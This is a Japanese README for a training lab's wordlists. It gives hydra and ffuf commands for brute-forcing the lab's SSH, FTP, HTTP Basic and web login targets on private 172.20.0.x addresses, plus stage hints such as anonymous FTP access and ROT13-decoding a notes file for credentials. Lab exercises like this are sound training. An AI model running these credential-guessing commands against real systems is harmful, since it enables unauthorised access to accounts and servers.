# HackLab ワードリスト

このラボ環境 (172.20.0.0/24) 専用のブルートフォース用リストです。  
**外部ホストへの使用は絶対に禁止します。**

## ファイル一覧

| ファイル | 内容 |
|---------|------|
| `usernames.txt` | ユーザー名リスト (ラボ登場ユーザー + 汎用) |
| `passwords.txt` | パスワードリスト (ラボ正解 + 汎用弱パスワード) |

## 使用例

### SSH ブルートフォース (target-ssh: 172.20.0.30)

```bash
# hydra
hydra -L usernames.txt -P passwords.txt ssh://172.20.0.30

# 特定ユーザーに絞る場合
hydra -l developer -P passwords.txt ssh://172.20.0.30
```

### Web HTTP Basic 認証 (target-web /admin)

```bash
hydra -L usernames.txt -P passwords.txt http-get://172.20.0.10/admin
```

### Web ログインフォーム (target-web /login)

```bash
hydra -L usernames.txt -P passwords.txt \
  http-post-form://172.20.0.10/login \
  "username=^USER^&password=^PASS^:ユーザー名またはパスワード"
```

### FTP 匿名ログイン確認 (target-ftp: 172.20.0.20)

```bash
# anonymous ログインは通常パスワード不要
ftp 172.20.0.20
# Username: anonymous
# Password: (空 or 任意のメールアドレス)

# ブルートフォースする場合
hydra -L usernames.txt -P passwords.txt ftp://172.20.0.20
```

### ffuf で Web ログインフォームをファジング

```bash
ffuf -w usernames.txt:USER -w passwords.txt:PASS \
  -u http://172.20.0.10/login \
  -X POST \
  -d "username=USER&password=PASS" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -fr "ユーザー名またはパスワード"
```

## 攻略ヒント

- **Stage 3 (FTP)**: `anonymous` / パスワード空でログイン → `notes.txt` を取得
- **Stage 6 (SSH)**: FTPで入手した `notes.txt` を ROT13 デコードして認証情報を得る
- **管理画面 (/admin)**: HTTP Basic 認証。よく使われるデフォルト認証情報を試す
